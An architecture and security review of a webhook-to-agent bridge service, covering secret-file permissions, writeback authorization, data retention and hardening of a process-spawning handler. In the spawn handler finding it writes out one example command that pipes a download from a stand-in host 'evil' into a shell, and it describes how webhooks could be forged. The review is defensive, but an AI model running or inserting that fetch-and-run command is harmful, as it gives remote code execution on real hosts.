# agent-webhook-bridge — Architecture Review

- **Date:** 2026-05-31
- **Reviewed at:** `agent-webhook-bridge-dev` @ v0.17.0 + DL-008 (branch `feat/channel-token-path`)
- **Method:** three independent adversarial reviewers, one lens each (scalability/extensibility, maintainability, security), grounded in the actual code (file:line evidence required).
- **Addendum:** backwards compatibility is **not** required (pre-1.0, single-operator) — breaking restructures are in-scope where the new structure is worth it.
- **Framing:** "plan to maintain and grow this project over the long term."

## Verdict

A genuinely well-built, deliberately-small codebase (~4.4k LOC app, ~4k LOC tests, 232 test methods). The synchronous in-request model (DL-001) is **correctly right-sized** and should not get a pre-built queue. Package boundaries, the DTO idiom, the HMAC/secret receiver, and the three-way failure contract are all sound. The findings below are about **seams drawn for v0.17 scale that calcify as the project grows** — all cheaper to redraw now (no backcompat) than later. Two themes dominate and recur across all three lenses:

1. **The writeback inversion** (the planned GitHub-PR→card-move FR, [board 8 #2016]): the bridge is one-way today, and the *easy* implementation (just another best-effort `Handler`) is the *wrong* one on both reliability (silent drop) and security (attacker-influenced privileged write) grounds. Design the seam before the code.
2. **Secrets + retention on a multi-tenant, append-only host**: DL-008's 0600 reasoning isn't applied to the higher-value secrets; and the inbox/event store has no rotation/retention and an O(file) hot-path dedup that breaks on *calendar time*.

---

## MUST-FIX (redraw before they calcify)

### B-1. Writeback needs a durable-reaction class + an authz/injection model — design it now (Scalability M2 + Security M3)
> **✅ Addressed (2026-05-31): DL-009** captures the seam (design-only; no code). Durability-on-the-handler marker, durable-first loop ordering with treatment-B propagation, dedicated least-privilege writeback token, operator-config repo→board mapping, GitHub-controlled-field gating, and a new global echo seam for the writeback identity. Gates FR #2016 (the implementation).

The pipeline is typed one-way: `Classifier → Intent/ReactionTarget`, `Handler::handle(): void`, and the only outbound client is `KanbanProvisionClient` (provisioning-scoped). A card-move writeback is **side-effectful, not loss-tolerant, and attacker-influenced** — the opposite of treatment-C (`DispatchService.php:170-183`, "connection-refused is NORMAL, swallow as a note"). If bolted on as a normal handler it inherits treatment-C → a failed move silently acks 200, never retries (violates DL-001 treatment-B). Security inversion: an attacker-controllable GitHub PR title/branch would drive a privileged kanban WRITE via the API token.
**Design (capture as a DL before any code):**
- A reaction class for **durable side effects** whose failure escalates to 5xx-and-retry (treatment B), not note-and-continue — tag `ReactionTarget`/handler `durable` vs `best_effort`; route durable failures into the propagate branch.
- A general `KanbanClient` (sibling to the provisioning client) reusing the per-provider token convention.
- repo→board mapping is **operator-config only**, never derived from the webhook body; validate target-card-belongs-to-mapped-board before moving.
- Gate the move on **GitHub-controlled** fields (`pull_request.merged == true`, `merged_by.id`), not attacker-settable title/branch text.
- A **dedicated least-privilege writeback token** (own 0600 path), not the broad provisioning token.
- **Echo-suppress the writeback identity** (wire the bridge's kanban user id into `treat_as_echo_ids`) or the resulting `task.moved` webhook loops back.
- Correlation ("which card is this PR?") stays in classifier/agent business logic — the bridge provides the *primitive*, not a workflow engine.

### B-2. Unify secret-file 0600 enforcement at point-of-use (Security M1)
> **✅ Addressed (2026-05-31): DL-010.** `SecretFile::isInsecure`/`read` is the single `mode & 0o077` gate; the HMAC receiver (500 `secret_perms_insecure`), `bridge:provision` (command FAIL), and `ChannelToken` all consult it; `bridge:check` warns on all three. Gate reads live perms (`clearstatcache`).

DL-008 enforces `mode & 0o077 == 0` on the channel token — but the two **higher-value** secrets don't get it: the per-(provider,scope) **HMAC secret** (`VerifyHmacSignature::loadSecret`, ~`:88`, bare `@file_get_contents`) and the **kanban API token** (`TokenFile::readTrimmed:23`, used with `Http::withToken`). A co-tenant who can *read* the HMAC secret forges perfectly-valid signed webhooks (→ `channel_push` into a live session, → `spawn_detached`); reading the API token gives direct upstream write access. The provisioner *writes* 0600 but nothing *enforces* it on read (a `cp`/`umask` accident leaves it 0644).
**Fix:** hoist the perms check into a shared `SecretFile::read` and apply to all three readers, fail-closed (HMAC → 500 `secret_perms_insecure`; token → command error). Extend `bridge:check` to warn on perms for all three.

### B-3. `spawn_detached` — make it opt-in + executable-allowlisted + shell-free (Security M2)
> **✅ Addressed (2026-05-31): DL-011.** Opt-in (`BRIDGE_SPAWN_ENABLED`, default off — `HandlerRegistry` doesn't register it otherwise); `cmd[0]` must be in `BRIDGE_SPAWN_ALLOWLIST` (absolute paths); execution is shell-free (`proc_open` argv + `setsid -f`, no `/bin/sh`). cwd/env are proc_open params.

`HandlerRegistry` registers `spawn_detached` unconditionally (`:28`); it runs `exec(setsid <argv> … &)`. The "cmd is operator-authored, not webhook data" guarantee is a **convention, not an invariant** — `docs/customization.md` invites custom classifiers, and the natural `ReactionTarget::make(handler:'spawn_detached', payload:$payload)` passthrough hands an attacker the argv. `escapeshellarg` stops metachar breakout but not *which program runs* (`cmd:["/bin/sh","-c","curl evil|sh"]`). Highest-blast-radius surface (RCE as install user on a shared box); over a long-enough horizon P(some operator wires a passthrough classifier) → 1.
**Fix:** (1) don't register by default — explicit per-install opt-in; (2) `config('bridge.spawn_allowlist')` of absolute program paths, reject `cmd[0]` not in it; (3) drop the shell — `proc_open` with an argv array + `posix_setsid`, no `cd && env` shell string.

### B-4. Retention/rotation + bounded inbox dedup — this breaks on calendar time, not load (Scalability M1 + M3)
> **✅ Addressed (2026-05-31): DL-012.** `bridge:prune --older-than=Nd [--null-payloads-older-than=Md] [--dry-run]` (deletes old events+dispatches, trims inbox lines, nulls old payloads). Per-intent O(file) hot-path dedup removed (`jsonlContainsId` deleted) — idempotency is the upstream `processed_at` gate + read-side id-collapse in `bridge:inbox`. Seen-cursor bounded by pruning the exact-id set (chosen over a high-water `ts` cursor — see DL-012 alternatives for the correctness reason).

`IntentLog::stage()` calls `jsonlContainsId()` **per intent**, which does `file($path)` + linear scan — and the common case (id absent) reads the **whole file every time** (`IntentLog.php:44-48`, `BridgePaths.php:62-75`). `InboxCommand` reads the whole inbox + an unbounded seen-array on **every hook fire** (SessionStart/PreToolUse — constant). Nothing prunes `inbox*.jsonl`, `inbox-seen*.json`, `webhook_events` (the `received_at` index is commented "retention pruning" but **no prune exists**), or `agent_dispatches`. Quadratic in file lifetime; inbox bloat directly inflates synchronous webhook latency → trips the upstream timeout the whole DL-001 bet depends on.
**Fix:** (1) `bridge:prune --older-than=Nd` (the one cron the design should accept) trimming inbox files + the two tables; (2) drop the per-intent JSONL dedup from the hot path — the authoritative gate already exists (`agent_dispatches.processed_at`, checked at `DispatchService.php:98`); (3) bound the seen-cursor to a high-water `ts`, not an ever-growing id set; (4) retention-null `webhook_events.payload` (50–100KB GitHub diffs) past the replay window.

### B-5. Mechanize doc-sync; fix the current drift (Maintainability M1)
> **✅ Addressed (2026-05-31): DL-013.** Fixed the four drift sites + two siblings (`ProviderApiConfig`/`agents.json`/`identity.self`, G-015 rewritten); added `bin/check-doc-refs.php` as a CI step (`laravel-tests.yml`) asserting every backtick PHP path/FQCN in the `CLAUDE_*.md` set resolves, with a removed-marker / `~~strikethrough~~` escape hatch.

The doc system *is* the onboarding path (for the next maintainer **and** the next Claude session), and it's already wrong on first read despite the standing "doc-sync in every PR" rule: `CLAUDE_ARCHITECTURE.md:95` lists deleted `ProviderApiConfig`; `:96,119` + `CLAUDE_GOTCHAS.md` G-015 still describe `agents.json` (replaced by scanned-YAML roster + `shared-identities.json` in DL-007) — and G-015 is the file opened *when something's already broken*; `BridgeServiceProvider.php:24` docblock repeats the stale `agents.json`.
**Fix:** (a) correct those four sites; (b) CI grep asserting every class name in non-historical `CLAUDE_*.md`/docblocks resolves to an extant file (allow an explicit `(removed in vX)` marker — the convention already exists in the DL log). Converts "remember to update docs" into "CI fails if you didn't."

### B-6. Delete the dead `ChannelName` validator (Maintainability M2)
> **✅ Addressed (2026-05-31):** `app/Bridge/Validation/ChannelName.php` + its `ValidatorsTest` cases deleted; the four `CLAUDE_*` doc references to it removed in the same change. No DL (trivial cleanup).

`channel.name` was deleted in DL-007, but `app/Bridge/Validation/ChannelName.php` survives — referenced **nowhere in app code**, kept green only by `tests/Unit/Validation/ValidatorsTest.php:23,62-66`. The most dangerous dead code: it has passing tests, so it looks load-bearing and a future maintainer will preserve/rewire it. Violates the project's own no-dead-config / scope-discipline posture.
**Fix:** delete the class + its test cases.

---

## SHOULD-CONSIDER

- **B-7. De-GitHub the identity model (Scalability S1).** Adapters generalize for envelope+signature, but identity/echo/shared-account logic is GitHub-shaped and lives in `AgentRegistry` (`actorFromEvent()` `if ($provider==='github')` `:286`; `byKanbanUserId`/`byGithubUserId`; `sharedGithubIds`). Provider #3/#4 will copy the branch under deadline. Push "extract immutable actor id" into the adapter; make registry lookups uniform `byActor(provider,id)`; shared-identity `(provider,id)`-keyed.
- **B-8. Extract a per-agent dispatch pipeline (Scalability S2 + Maintainability N2).** `DispatchService::dispatch` is ~125 lines interleaving echo → signal → classify → reattribution → coalesce → route_intents-synthesis → handle. Each new agent-behavior feature lands *in the loop*. Extract explicit stages so new features are new stages, and the per-agent body becomes the clean enqueueable unit when the queue trigger eventually fires. Also pick **one** channel-fan-out mechanism as canonical (`route_intents`, config not code) and demote `EventDrivenClassifier` to an example (kills the documented "two pushes per event" footgun).
- **B-9. Split the two files that outgrew their names (Maintainability S1+S2).** ⚠️ **Partial (DL-017): the `AgentConfig` identity triple is grouped into an `IdentityConfig` DTO (the concrete smell). The `BridgePaths` 3-way split + `AgentConfigParser` extraction are declined — see "Deferred / declined" below.** `BridgePaths` (257 lines) does 5 jobs (state-dir, JSONL IO, inbox path construction, layout validation, perms) → `BridgePaths` + `JsonlStore` + `InboxLayout`. `AgentConfig` (307 lines, 11-positional-arg constructor) is both parser and parsed shape → extract `AgentConfigParser`; group the 11 fields into the sub-DTOs (`identity`, `EchoSuppressionConfig`, `ChannelConfig`, api-overrides) — same medicine DL-008 applied to the channel tuple.
- **B-10. One `InstallValidator` shared by `bridge:check` and runtime (Maintainability S4).** ⚠️ **Partial — the S3 sub-item is addressed (DL-016): `CheckCommand` now extends `BridgeCommand`. The InstallValidator extraction is declined (see "Deferred / declined" below).** `CheckCommand` (186 lines) re-implements "what makes an install valid" as a second definition that will drift from the dispatch-time fail-closed rules. Extract one validator both consult — `bridge:check` becomes a thin renderer over the validation the runtime trusts. (Also: `CheckCommand` doesn't extend `BridgeCommand` — S3, the DL-007 base-class consolidation is incomplete.)
- **B-11. Current-state config schema doc (Maintainability S5).** ✅ **Addressed:** added [`docs/config-schema.md`](../config-schema.md) (every per-agent YAML key + `BRIDGE_*` env, type, default, fail-closed-vs-warn) + a subfile-index row. The *current* YAML schema can only be reconstructed by reading DL-002+005+006+007+008 as sequential deltas. Add one `docs/config-schema.md` (current-state: every key, type, default, fail-closed-vs-warn) — DLs stay the *why*, this is the *what*. Highest-leverage doc for the "new operator" persona.
- **B-12. Transport as named profiles, not orthogonal flags (Scalability S3).** `resolveChannel`/`validateInboxConfig` now encode 5+ mutual-exclusion rules fencing off invalid corners of a combinatorial config product (socket|url, route_intents, token-needs-url, inbox_group-needs-per-agent…). Model transport as a typed enum of named profiles (`uds-local`, `loopback-token`, `ssh-tunnel`) — collapses the product space to a sum type. Direction-setting, not urgent.
- **B-13. Regex anchor latent bug (Security S4).** ✅ **Addressed (DL-014):** added the `D` modifier to `ProviderName`/`ScopeId` `matches()` + trailing-newline tests. `ProviderName`/`ScopeId` patterns lack the `D` modifier (or `\z`), so `$` matches before a trailing `\n` — a trailing-newline injection could slip a second line past the anchor. Low exploitability (provider from route, scope re-checked vs body) but add `D`/`\z` + a test.
- **B-14. Constrain classifier-supplied `socket` paths (Security S2).** ✅ **Addressed (DL-014):** classifier-supplied sockets must sit under `BRIDGE_CHANNEL_ALLOWED_SOCKET_DIR` (fail-closed when unset); `..`-rejected before the prefix compare; agent-config sockets exempt. The `url` transport is loopback-gated but a classifier-supplied `socket` has no path-prefix constraint — a custom classifier could point `channel_push` at another tenant's UDS. Constrain to a configured state-dir prefix (same custom-classifier surface class as B-3).

## NICE-TO-HAVE

- **B-15.** ✅ **Addressed (DL-015):** `bridge:check` fails if a `config('bridge.providers')` key has no `WebhookAdapterFactory` adapter. Two provider lists drift (`WebhookAdapterFactory::SUPPORTED` vs `config('bridge.providers')`) — derive one or assert in `bridge:check` (Scal N1).
- **B-16.** ✅ **Addressed (DL-015):** `composer audit` job added to `security.yml` (PR + nightly). `composer audit` CI step in `security.yml` — catches a fresh CVE on PR vs waiting for dependabot (Sec N2).
- **B-17.** ✅ **Addressed (DL-014):** `bridge:check` warns when the config dir is group/world-accessible (`mode & 0o077`). `bridge:check` assertion that the config dir is actually 0700 / not group-writable on a multi-tenant host (Sec N3).
- **B-18.** ✅ **Addressed (DL-016):** trimmed the Python-provenance docstrings (`Classifier`, `PathHelper`, `appendJsonl` ksort note); kept the `parse_url`/internal-ref ones. Trim bare "mirrors the Python contract" provenance docstrings (`Classifier.php:14`, etc.) — keep only the ones justifying a behavior (ksort, parse_url) (Maint N1).
- **B-19.** ✅ **Addressed (DL-016):** one `BridgePaths::ensureDir` for all four `mkdir(0700)` sites; no-`TrustProxies` posture documented in `CLAUDE_ARCHITECTURE.md`. Single `BridgePaths::ensureDir` so 0700 can't drift per call site; document the no-`TrustProxies` posture (Sec N1/N4).
- **B-20.** `SpawnDetachedHandler` is the un-orchestrated async escape hatch with no outcome tracking — where "durable async work" pressure shows first; `bridge:replay` can't recover a died spawn (Scal N3).

---

## Deferred / declined (with justification)

Implemented 2026-05-31: B-1…B-6 (MUST-FIX), B-9-identity / B-10-S3 (partial), B-11, B-13–B-19. The following SHOULD-CONSIDER / NICE-TO-HAVE items are **deliberately not implemented** — each is speculative (building for a state that doesn't exist yet) or churn on cohesive, well-tested code with no correctness gain. They are recorded here so the decision is explicit, not forgotten; revisit each when its trigger actually fires.

- **B-7 — De-GitHub the identity model.** Declined: speculative. There are exactly **two** providers (kanban, github) and no third on the roadmap. Abstracting `AgentRegistry`'s `if ($provider==='github')` branch for hypothetical providers #3/#4 is generalizing from one concrete case — you design the right abstraction from the *third* real provider, not from a guess. The branch is localized and tested. **Revisit when a third provider is actually requested** (`docs/provider-adapters.md` is the entry point); the generalization is a small, clear change then.
- **B-8 — Extract a per-agent dispatch pipeline.** Declined: directly contradicted by this review's own "Already right-sized — resist churn" (*"Do not refactor the dispatch core … for scale reasons"*) and by DL-001 (no queue; re-introduce only with evidence). B-8 is explicitly framed as prep "for when the queue trigger eventually fires" — a future the design deliberately defers. The ~125-line loop is linear and readable; extracting stages now adds indirection for no present benefit. The one concrete sub-point (the `EventDrivenClassifier` "two pushes" footgun) is already documented (DL-006). **Revisit if/when a queue is justified by a measured receive/process throughput mismatch.**
- **B-9 (file splits) — `BridgePaths` 3-way split + `AgentConfigParser` extraction.** Declined (the identity-DTO part is done, DL-017): line-count-driven splits of cohesive, well-tested classes, with broad call-site churn and zero correctness gain. `BridgePaths`' jobs (state-dir / JSONL IO / inbox paths / perms) are related; `AgentConfig` as parser+shape is a common, readable pattern. **Revisit when one of those files next needs a real change** — split it then, with a second reason in hand.
- **B-10 (validator extraction) — one `InstallValidator` shared by `bridge:check` and runtime.** Declined (the S3 base-class part is done, DL-016): the runtime is already fail-closed on a malformed install (`SubscriptionRegistry` throws → 5xx); `bridge:check` is a *preflight reporter* over that. Merging them would route the runtime dispatch path through a refactored validator — touching the security/dispatch gate the resist-churn section says to leave alone — for a drift risk that is low (both consult the same `SubscriptionRegistry`/`AgentConfig` load). The cheap, safe win (the base-class alignment) is taken; the extraction is not worth the runtime-path risk.
- **B-12 — Transport as named profiles.** Declined: the review itself marks it *"Direction-setting, not urgent."* The current `socket|url` + `route_intents` + token mutual-exclusion rules are fail-closed and tested. Collapsing them to a typed profile enum is a **breaking config-surface rewrite** for elegance, not correctness, at three-topology scale. **Revisit only if the config product genuinely grows** beyond what the explicit rules can fence.
- **B-20 — `spawn_detached` outcome tracking.** Declined: speculative, and **less** likely after B-3 made `spawn_detached` opt-in/default-off (the reference installs don't use it). The item anticipates "durable async work pressure" that hasn't materialized; and DL-009 already designs the proper durable-side-effect path (`DurableReaction`) for when a durable reaction is actually needed — a fire-and-forget spawn is by design fire-and-forget. **Revisit if an operator adopts `spawn_detached` for work that must not be lost** (point them at the durable-reaction seam instead).

---

## Already right-sized — resist churn

No queue (DL-001); `dedupCreate` + `UNIQUE(delivery_id)` idempotency; no `DB::transaction` around the send loop (can't un-send a POST); `AbstractWebhookAdapter` single `hash_equals` path; filename-as-agent-name (DL-007); the HMAC/scope-double-check receiver; the DTO idiom; the unit-vs-feature test taxonomy; the fail-closed posture throughout. **Do not refactor the dispatch core or the security gate for scale reasons** — the synchronous core remains the right bet.

---

## Top bets (synthesized)

1. **Draw the durable-reaction + writeback-authz seam now, while writeback is still hypothetical (B-1).** Two-way-ness should enter as a contract extension, not a treatment-C + confused-deputy violation. This is the one finding all three lenses raised.
2. **Build retention/rotation + secret-perms unification (B-4 + B-2).** The two things a long-lived append-only, multi-tenant system cannot lack: a prune story, and every secret held to the DL-008 0600 bar. Both are zero-contract-change and break-on-calendar-time if skipped.
3. **Make `spawn_detached` safe-by-default + mechanize doc-sync (B-3 + B-5).** The only RCE path goes default-off + allowlisted; the onboarding map stops being able to silently rot. Each protects the thing a careful single operator can't sustain by discipline alone over time.

---

*Full per-lens reports (scalability / maintainability / security) were produced by three independent reviewers; this document is the synthesized, deduplicated, prioritized result. Backlog items derived from this review are tracked on kanban board 8 (bridge), tagged `architecture-review`.*
